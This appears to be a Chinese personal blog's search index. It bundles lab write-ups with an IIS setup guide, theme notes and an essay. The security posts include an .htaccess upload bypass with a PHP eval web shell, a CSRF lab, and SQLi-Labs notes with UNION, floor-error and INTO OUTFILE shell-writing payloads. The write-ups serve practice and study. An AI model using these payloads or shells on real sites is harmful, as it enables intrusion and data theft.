<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>.htaccess文件上传漏洞利用</title>
    <url>/2020/01/20/htaccess%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。它是Apache服务器中的一个配置文件，负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br>当网站允许上传或修改.htaccess文件时，我们就可以利用.htaccess文件中的一些规则，来达到我们的目的。</p>
<a id="more"></a>

<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>该漏洞利用了Apache配置下的&lt;FileMatch&gt;指令和SetHandler 指令</p>
<p>以下是Apache官方文档中对两个指令的描述</p>
<blockquote>
<p>&lt;FilesMatch&gt; 指令<br>描述：    包含适用于正则表达式匹配文件名的指令<br>句法：    &lt;FilesMatch regex&gt; … &lt;/FilesMatch&gt;<br>内容：    服务器配置，虚拟主机，目录，.htaccess<br>覆写：    所有<br>状态：    核心<br>模组：    核心</p>
</blockquote>
<hr>
<blockquote>
<p>SetHandler 指令<br>描述：    强制所有匹配文件由处理程序处理<br>句法：    SetHandler handler-name|none|expression<br>内容：    服务器配置，虚拟主机，目录，.htaccess<br>覆写：    文件信息<br>状态：    核心<br>模组：    核心<br>兼容性：    表达式参数2.4.19及更高版本</p>
</blockquote>
<p>将两者结合起来时，我们可以得到以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//.htaccess</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;ggboom993&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/filesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>意为 将文件名中包含”ggboom993”这一字符串的所有文件，强制由php解析。</p>
<p>此时 如果名为”ggboom993”的文件中包含php一句话，那么在上传成功后，可以直接连菜刀获取shell。<br>实战中：<br>1、如果存在可以上传.htaccess文件，上传新文件添加解析规则<br>2、如果存在可以修改.htaccess文件，直接修改解析规则</p>
<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>先在服务器上写了一段简单的php文件上传代码,本地准备好.htaccess文件和html文件</p>
<p>upload.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">		&lt;!-- enctype=&quot;mulipart/form-data&quot;属性是指以二进制方式进行数据传输 </span><br><span class="line">		传输文件需要设置--&gt;</span><br><span class="line">		&lt;form action=&quot;upload_server.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;max_file_size&quot; value=&quot;1048576&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot; name=&quot;上传&quot;&gt;		</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;/center&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>upload_server.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">//设置时区</span><br><span class="line">	date_default_timezone_set(&apos;PRC&apos;);</span><br><span class="line"></span><br><span class="line">//获取文件名</span><br><span class="line">	$filename = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">//获取文件临时路径</span><br><span class="line">	$temp_name = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</span><br><span class="line"></span><br><span class="line">//获取大小</span><br><span class="line">	$size = $_FILES[&apos;file&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">//获取文件上传码，0代表文件上传成功</span><br><span class="line">	$error = $_FILES[&apos;file&apos;][&apos;error&apos;];</span><br><span class="line"></span><br><span class="line">//判断文件大小是否超过设置的最大上传限制</span><br><span class="line">	if ($size &gt; 2*1024*1024)&#123;</span><br><span class="line">		//</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&apos;文件大小超过2M大小&apos;);window.history.go(-1);&lt;/script&gt;&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">//phpinfo函数会以数组的形式返回关于文件路径的信息 </span><br><span class="line">//[dirname]:目录路径[basename]:文件名[extension]:文件后缀名[filename]:不包含后缀的文件名</span><br><span class="line"></span><br><span class="line">	$arr = pathinfo($filename);</span><br><span class="line"></span><br><span class="line">//获取文件的后缀名</span><br><span class="line">	$ext_suffix = $arr[&apos;extension&apos;];</span><br><span class="line"></span><br><span class="line">//设置允许上传文件的后缀</span><br><span class="line">	$allow_suffix = array(&apos;jpg&apos;,&apos;gif&apos;,&apos;jpeg&apos;,&apos;png&apos;,&apos;htaccess&apos;,&apos;html&apos;);</span><br><span class="line"></span><br><span class="line">//判断上传的文件是否在允许的范围内（后缀）==&gt;白名单判断</span><br><span class="line">	if(!in_array($ext_suffix, $allow_suffix))&#123;</span><br><span class="line">		//window.history.go(-1)表示返回上一页并刷新页面</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&apos;上传的文件类型不符&apos;);window.history.go(-1);&lt;/script&gt;&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">//检测存放上传文件的路径是否存在，如果不存在则新建目录</span><br><span class="line">	if (!file_exists(&apos;uploads&apos;))&#123;</span><br><span class="line">		mkdir(&apos;uploads&apos;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">//将文件从临时路径移动到磁盘</span><br><span class="line">	if (move_uploaded_file($temp_name, &apos;uploads/&apos;.$filename))&#123;</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&apos;upload success！&apos;);window.history.go(-1);&lt;/script&gt;&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&apos;upload fail,ERROR：$error&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;ggboom993&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/filesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>ggboom993.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">@eval($_POST[&apos;ggboom993&apos;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上传.htaccess和html文件</p>
<img src="/2020/01/20/htaccess文件上传漏洞利用/timg1.PNG">
<img src="/2020/01/20/htaccess文件上传漏洞利用/timg2.PNG">

<p>进服务器查看一下，确认上传成功。此时的.htaccess文件将会匹配文件名有”ggboom993”的文件，并强制使用php解析。</p>
<img src="/2020/01/20/htaccess文件上传漏洞利用/timg3.PNG">

<p>在蚁剑中获取shell</p>
<img src="/2020/01/20/htaccess文件上传漏洞利用/timg4.PNG">]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>利用IIS+腾讯云服务器部署网站</title>
    <url>/2020/01/10/%E5%88%A9%E7%94%A8IIS-%E8%85%BE%E8%AE%AF%E4%BA%91%E9%83%A8%E7%BD%B2%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间期末大作业，买了一个月服务器，搭建个网站完成测试，过程也没记录下来。</p>
<p>现在趁着年轻，赶紧回家买了一年服务器（毕竟便宜），一是学习、了解下基本Web配置，二是有个自己的环境吧，方便练手之类的。</p>
<a id="more"></a>

<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>我这里购买的是腾讯云学生服务器，很便宜一个月10，一年120，当然配置也只是勉强能用。</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg1.PNG">

<p>在服务器环境上，我选择Windows server 2012R2 集成了PHPstudy，主要还是为了方便，性能什么的就不考虑了。实名，购买等过程就不加赘述，域名我也不打算弄，因为是自己用。</p>
<h1 id="添加IIS"><a href="#添加IIS" class="headerlink" title="添加IIS"></a>添加IIS</h1><p>购买完成后，在腾讯云控制台可以看见自己的服务器情况，以及进行调整资源、配置安全组等操作。</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg2.PNG">

<p>登录服务器之后，会自动跳出服务器管理工具，选择添加角色和功能把IIS服务勾选添加</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg3.PNG">

<p>下一步后，展开.NET Framework4.5 勾选ASP.NET 以及CGI之后一直下一步到安装</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg4.PNG">

<p>安装完成后通过控制面板→系统和安全→管理工具 打开IIS管理工具</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg5.PNG">

<h1 id="Web配置"><a href="#Web配置" class="headerlink" title="Web配置"></a>Web配置</h1><p>在IIS管理工具中添加网站文件，设置网站名称、网站路径、端口等</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg6.PNG">

<p>需要对网站添加一些配置。首先开启目录浏览，选择网站→目录浏览→启用</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg7.PNG">

<p>接着打开默认文档，设定初始加载网页。由于我这里使用的是PHP的网站源码，所以需要根据源码添加XXX.php</p>
<p>添加映射。选择处理程序映射→添加模块映射</p>
<p>选择FastCgiModule模块，并添加exe文件</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg8.PNG">

<p>接着我在配置中开启了父路径，开启父路径后可以用../来表示上一层目录，如果网站程序中使用了../，不开启则网站程序里有../就会报错。<br>选择iis下ASP栏目→启用父路径→设置为True.</p>
<img src="/2020/01/10/利用IIS-腾讯云部署网站/timg9.PNG">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上做完基本就完成了，可以现在本地浏览，查看效果再发布出去。<br>这次做了一些基本的Web配置，足以让网站顺利运行，日后有其它需要将额外再对配置进行修改。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF本地漏洞实现</title>
    <url>/2019/12/29/%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0csrf/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF(跨站请求伪造)</p>
<p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 CSRF攻击需要很多条件，首先用户需要点击恶意连接，其次用户PC上需要已经打开包含CSRF的网页。</p>
<a id="more"></a>

<h1 id="本地实现"><a href="#本地实现" class="headerlink" title="本地实现"></a>本地实现</h1><p>这里使用Pikachu靶场来进行演示。GitHub：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
<p>进入到靶场中包含CSRF的页面。</p>
<img src="/2019/12/29/本地靶场复现csrf/timg1.PNG">

<p>选择修改信息然后使用burp抓包，</p>
<img src="/2019/12/29/本地靶场复现csrf/timg2.PNG">

<p>可以发现浏览器URL中没有信息，但是使用burp抓包后，可以看见要修改的信息，sex等，然后将此包send to repeater</p>
<p>在repeater里面将包中信息的内容进行修改，然后send，观察下页面上的信息，已经改变了</p>
<img src="/2019/12/29/本地靶场复现csrf/timg3.PNG">

<p>到这一步就可以发现确实是存在CSRF漏洞的，在burp中可以直接生成CSRF的相关POC，此功能只有burp pro版可以使用，所以该破解的还是要破解</p>
<img src="/2019/12/29/本地靶场复现csrf/timg4.png">

<p>利用burp生成的POC其实是一串HTML代码，里面是一个信息from表单。当用户已经打开了修改信息页面，并且此时点击了包含POC的恶意链接，那么用户的信息就会被修改为指定信息。</p>
<h1 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h1><p>由此可见CSRF的触发条件虽然苛刻，但是CSRF同样存在危害。</p>
<p>网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>靶场练习</tag>
        <tag>Web渗透</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo主题个人优化</title>
    <url>/2019/11/18/hexo%E4%B8%BB%E9%A2%98%E4%B8%AA%E4%BA%BA%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不久之前搭建了hexo博客，陆陆续续的上传了一些整理的东西，之后的内容慢慢来吧。闲下来的时候会逛逛别人的博客，看些技术文章，有时也纯欣赏，回过头看看自己的，一言难尽。博客的内容需要日积月累，但是对于美的追求可以说来就来。</p>
<p>最开始配置hexo的时候，next主题是使用人数最多的，不过当时没选它，我用的是yilia主题，看上了它的简单，之后做美化还是改成了next，这时候觉得它布局好，可塑性强。</p>
<p>百度上一搜一大把的next主题优化，无非就是主题配置的 true or false的选择开关，或者一些便捷性改变，比如添加友链，添加分类等等，这些也能在<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">next官方文档</a>直接查看，做完这些之后，我发现并不能让我的博客与众不同。也看了更多的next主题美化，内容多是大同小异，即便有令人惊艳之处，作者也不会在文章中说明详细。</p>
<a id="more"></a>

<p>经过十几个小时的摸索中，可以说弄明白了next主题的大部分css样式，并且经过自己修改，结果还算满意，这是截止至2019年11月18日的博客样子</p>
<img src="/2019/11/18/hexo主题个人优化/主页.PNG" title="主页">

<p>下面我将会详细说明我修改的next主题css和基本配置，以供自我回顾，和方便有兴趣的读者参考。</p>
<h1 id="主题文件配置"><a href="#主题文件配置" class="headerlink" title="主题文件配置"></a>主题文件配置</h1><p>此项所有都在 /blog/thems/next/_config.yml 中修改，可直接搜索关键字定位。</p>
<h2 id="主题样式"><a href="#主题样式" class="headerlink" title="主题样式"></a>主题样式</h2><p>选择为next主题下的 Mist</p>
<img src="/2019/11/18/hexo主题个人优化/timg1.PNG">

<h2 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h2><p>菜单栏增加 主页、关于、标签、分类、归档</p>
<img src="/2019/11/18/hexo主题个人优化/timg2.PNG">

<h2 id="侧边栏"><a href="#侧边栏" class="headerlink" title="侧边栏"></a>侧边栏</h2><p>调整侧边栏出现方向，宽度</p>
<img src="/2019/11/18/hexo主题个人优化/timg3.PNG">


<h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>需将头像图片放入/image/中，自由命名。</p>
<p>设立圆形头像</p>
<p>设立头像旋转</p>
<img src="/2019/11/18/hexo主题个人优化/timg4.PNG">


<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><p>联系方式显示在侧边栏中，这里只选择了github和weibo，修改时需替换url为自己的地址。</p>
<img src="/2019/11/18/hexo主题个人优化/timg5.PNG">

<h2 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a>友情链接</h2><p>友情链接可以自己自定义内容，如推荐阅读等</p>
<img src="/2019/11/18/hexo主题个人优化/timg6.PNG">

<h2 id="显示阅读字数，时间"><a href="#显示阅读字数，时间" class="headerlink" title="显示阅读字数，时间"></a>显示阅读字数，时间</h2><p>在主题文件中做如下修改：</p>
<img src="/2019/11/18/hexo主题个人优化/timg7.PNG">

<p>在站点配置文件（/blog/_config.yml）中添加：</p>
<img src="/2019/11/18/hexo主题个人优化/timg8.PNG">

<h2 id="代码块颜色"><a href="#代码块颜色" class="headerlink" title="代码块颜色"></a>代码块颜色</h2><p>可在注释中Available values中进行选择</p>
<img src="/2019/11/18/hexo主题个人优化/timg9.PNG">

<h2 id="显示阅读百分比和回到顶端"><a href="#显示阅读百分比和回到顶端" class="headerlink" title="显示阅读百分比和回到顶端"></a>显示阅读百分比和回到顶端</h2><img src="/2019/11/18/hexo主题个人优化/timg10.PNG">

<h2 id="设置动态背景（next自带）"><a href="#设置动态背景（next自带）" class="headerlink" title="设置动态背景（next自带）"></a>设置动态背景（next自带）</h2><p>我选择的是canvas_nest，下面参数设定了线条颜色，数量，粗细</p>
<img src="/2019/11/18/hexo主题个人优化/timg11.PNG">

<h1 id="CSS样式修改"><a href="#CSS样式修改" class="headerlink" title="CSS样式修改"></a>CSS样式修改</h1><p>CSS样式文件位于/blog/themes/next/source/css/_schemes/Mist<br>因为我是用的是Mist所以我修改的CSS都是Mist的CSS，其余主题分支仅供参考</p>
<h2 id="顶部区域"><a href="#顶部区域" class="headerlink" title="顶部区域"></a>顶部区域</h2><p>1、修改顶部区域背景。RBG色透明度0.4</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_header.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg12.PNG">

<h2 id="菜单栏-1"><a href="#菜单栏-1" class="headerlink" title="菜单栏"></a>菜单栏</h2><p>1、改菜单栏选项的样式，圆角、模块长度</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_menu.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg13.PNG">


<h2 id="分页栏"><a href="#分页栏" class="headerlink" title="分页栏"></a>分页栏</h2><p>1、修改分页栏长度，居中，背景透明，字体颜色</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_layout.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg14.PNG">

<h2 id="底部区域"><a href="#底部区域" class="headerlink" title="底部区域"></a>底部区域</h2><p>1、修改底部区域背景透明，间距，字体颜色</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_layout.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg15.PNG">

<h2 id="主页面文章区域"><a href="#主页面文章区域" class="headerlink" title="主页面文章区域"></a>主页面文章区域</h2><p>1、修改主页每篇文章小框架间距，以及标题居中</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_posts-expand.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg16.PNG">

<p>2、修改“阅读全文”，背景、位置等</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_posts-expand.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg18.PNG">

<p>3、修改主页文章区域背后的白色区域，这里修改为透明</p>
<p>位于/blog/themes/next/source/css/_custom/custom.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg17.PNG">

<p>4、主页面单独文章框体宽度</p>
<p>位于/blog/themes/next/source/css/_schemes/Mist/_layout.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg21.PNG">

<p>5、修改文章内链样式</p>
<p>位于/blog/themes/next/source/css/_common/components/post/post.styl</p>
<p>不修改之前内链颜色为灰色+下划线，不明显，修改之后为蓝色</p>
<img src="/2019/11/18/hexo主题个人优化/timg22.PNG">


<h2 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h2><p>1、需将背景图片放入/images/可自由命名</p>
<p>位于/blog/themes/next/source/css/_custom/custom.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg19.PNG">

<h2 id="侧边栏-1"><a href="#侧边栏-1" class="headerlink" title="侧边栏"></a>侧边栏</h2><p>1、侧边栏我没做很多调整，只修改了字体颜色，看的更清楚些</p>
<p>位于/blog/themes/next/source/css/_common/outline/sidebar/sidebar.styl</p>
<img src="/2019/11/18/hexo主题个人优化/timg20.PNG">


<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>以上就是我的hexo配置。在文件位置中/blog/为自己搭建hexo的根目录，其余在css中提到的修改，如果没有找到对应语句，可自行添加。在next主题7.x中css文件下没有_custom/custom.styl，可自行创建文件，并在<br>在./blog/themes/next/source/css/main.styl末尾加入 @import “_custom/custom.styl”; 引用即可</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>博客相关</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLi-Labs过关笔记</title>
    <url>/2019/11/17/SQLi-Labs/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SQLi-Labs是某印度程序猿开发的一套练习SQL注入的靶场，共计65关。难度从浅入深，涉及多种sql注入方法</p>
<p>原项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
<p>本篇将逐步上传已经完成关卡的攻略过程，以及更新未完成的攻略。</p>
<a id="more"></a>

<h1 id="Less1-Less10"><a href="#Less1-Less10" class="headerlink" title="Less1-Less10"></a>Less1-Less10</h1><h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><p>1、首先已经判断出是 ‘ 闭合，order by判断字段数，从下图可见 3正确4错误 </p>
<p>-1’order by 3–+</p>
<img src="/2019/11/17/SQLi-Labs/timg1.PNG">
<img src="/2019/11/17/SQLi-Labs/timg2.PNG">

<p>2、接下来联合查询看回显，得到数据库和用户</p>
<p>-1’ union select 1,databse(),user()–+</p>
<img src="/2019/11/17/SQLi-Labs/timg3.PNG">

<p>3、爆表名</p>
<p>-1’ union select 1,2,table_name from information_schema.tables<br>where table_schema=database()–+</p>
<img src="/2019/11/17/SQLi-Labs/timg4.PNG">

<p>4、爆出users中的列名</p>
<p>-1’ union select 1,2,column_name from information_schema.columns<br>where table_name=’users’–+</p>
<img src="/2019/11/17/SQLi-Labs/timg5.PNG">

<p>5、爆出username，同理可爆出password，less1结束</p>
<img src="/2019/11/17/SQLi-Labs/timg6.PNG">


<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>1、判断闭合，发现加入单引号或双引号提示数据库语句错误，最后确定是没有闭合的常规数字型注入</p>
<img src="/2019/11/17/SQLi-Labs/timg7.PNG">

<p>2、之后的过程同less1一样，不再重复描述，less2结束</p>
<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>1、判断闭合，加入单引号，发现报错。 可以通过报错判断出，是 ‘) 闭合</p>
<img src="/2019/11/17/SQLi-Labs/timg8.PNG">

<p>2、看回显，没问题，之后的过程同less1一样，不再重复描述，less3结束</p>
<img src="/2019/11/17/SQLi-Labs/timg9.PNG">

<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>1、闭合，加入’发现没有报错，加入”报错，通过报错可以判断，是”）闭合判断</p>
<img src="/2019/11/17/SQLi-Labs/timg10.PNG">

<p>2、看回显，没问题，之后过程同less1一样，不再重复描述，less4结束</p>
<img src="/2019/11/17/SQLi-Labs/timg11.PNG">

<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>1、判断闭合，加入’发现报错，加入”没有报错，接着”and1=2–+ 发现没报错,-1”union select 1,2,3 –+无回显，所以猜测使用报错注入</p>
<img src="/2019/11/17/SQLi-Labs/timg12.PNG">

<p>常用报错注入有三种：floor报错，updatexml报错，extractvalue报错<br>这里使用floor报错 ‘ 闭合</p>
<p>2、爆库</p>
<p>通过调整limit达到遍历的效果，找到需要的库<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select schema_name from information_schema.schemata limit 8,1),0x7e,floor(rand(0)*2))–+</p>
<img src="/2019/11/17/SQLi-Labs/timg13.PNG">

<p>3、爆表</p>
<p>同理可调整limit遍历出需要的表users<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e,floor(rand(0)*2))–+</p>
<img src="/2019/11/17/SQLi-Labs/timg14.PNG">


<p>4、爆列</p>
<p>调整limit遍历出 id,username,password<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 2,1),0x7e,floor(rand(0)*2))–+</p>
<img src="/2019/11/17/SQLi-Labs/timg15.PNG">

<p>5、爆数据</p>
<p>调整列名以及limit遍历出对应列下面的数据<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database()  group by concat(0x7e,(select username from users limit 1,1),0x7e,floor(rand(0)*2))–+</p>
<p>less5结束</p>
<img src="/2019/11/17/SQLi-Labs/timg16.PNG">

<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><p>根据主页less6的名称可以知道是 “ 闭合，剩下步骤同less5，不再描述，less6结束</p>
<img src="/2019/11/17/SQLi-Labs/timg17.PNG">

<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>less7的标题是这样描述的 dump into outfile 提示我们写入外部文件<br>需要利用数据库的into outfile 命令</p>
<p>1、通过尝试发现是 ‘))闭合，然后用以下命令写入文件，并加入一句话</p>
<p>?id=-1’))  union select 1,”此处放入一句话”,3 into outfile “D:\phpStudy\PHPTutorial\WWW\less7.php” –+</p>
<img src="/2019/11/17/SQLi-Labs/timg18.PNG">

<p>完成后因为条件允许，所以可以去本地目录验证一下</p>
<img src="/2019/11/17/SQLi-Labs/timg19.PNG">

<p>很好，可以看见这里没有写入的less7.php，找一找问题出在哪里。检查语法，检查mysql，都没有问题。估计是权限的问题，然后经过一番询问和百度，找到了原因。在mysql配置文件my.ini下有一个参数，secure-file-priv。由于启动mysql的时候使用了secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFILE之类文件的目录位置。我的my.ini中没有找到这个参数，不要紧，手动添加secure-file-priv = “”</p>
<pre><code>其中当参数 secure_file_priv 为空时，对导入导出无限制
当值为一个指定的目录时，只能向指定的目录导入导出
当值被设置为NULL时，禁止导入导出功能</code></pre><p>关于mysqlsecure-file-priv权限的详细解答：<br><a href="https://blog.csdn.net/bnxf00000/article/details/64123549" target="_blank" rel="noopener">https://blog.csdn.net/bnxf00000/article/details/64123549</a></p>
<p>2、重启mysql,重新写入并验证,成功</p>
<img src="/2019/11/17/SQLi-Labs/timg20.PNG">

<p>3、上菜刀连接</p>
<p>结果如图，less7结束</p>
<img src="/2019/11/17/SQLi-Labs/timg21.PNG">

<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>靶场练习</tag>
        <tag>Web渗透</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>尘</title>
    <url>/2019/11/13/%E5%B0%98/</url>
    <content><![CDATA[<h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>尘，不知道下一刻自己会去哪</p>
<p>尘，不知道下一刻会不会遇见其他的尘</p>
<p>尘，不知道下一刻自己是什么样</p>
<p>尘，没有思考</p>
<p>尘，独自漂着</p>
<a id="more"></a>

<h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>已经不记得什么时候了，我再也没有尝试走回宿舍——从整个学校的大门走回宿舍。</p>
<p>今天偶然的又走了一次，感觉不再同从前一样。</p>
<p>从学校大门走回宿舍的距离是比较远的，多数人的选择除了骑单车就是校园巴士，而我，就算抱再多东西都是愿意走路回去的。</p>
<p>但是今天不一样，也许是今天才意识到不一样。尽管同样是走回宿舍。直到这一次走回宿舍，才想起，上一次走回宿舍已经是上学期的事了。这样的感觉和以往是不同的，像尘。<br>没有意识，没有思考，没有准备，难以预料的下一刻，等回过神来，才发现，原来自己已经和其它尘一样了，我遇见了那个尘，也变成了一模一样的尘。</p>
<p>同样的路程，今天走的格外疲惫，时间也慢了下来。特地放慢脚步的我，每往前走一步，便感觉与一些东西渐行渐远，像过去，像我，像尘。</p>
<p>走了很久，走了很远，抬头的时候已经在宿舍楼下了，反复环视了一圈才告诉自己，目的地到了，不容易，也不困难。可是，走完这一程就真的走完了。下一次在什么时候呢？<br>尘不知道，我不知道。</p>
<h4 id="三"><a href="#三" class="headerlink" title="三"></a>三</h4><p>我已经忘了我的初心是什么。在一些事情之前，我以为我会变得不一样，我能够敞开心扉，我们够不再躲藏，我可以不用担心我的情绪，不用担心对方的情绪，我总是这样敏感。<br>事实上，最初我以为的，已经在时间磨砺下显露出埋藏在戎装之下的娇嫩，轻轻一划，留下伤疤。</p>
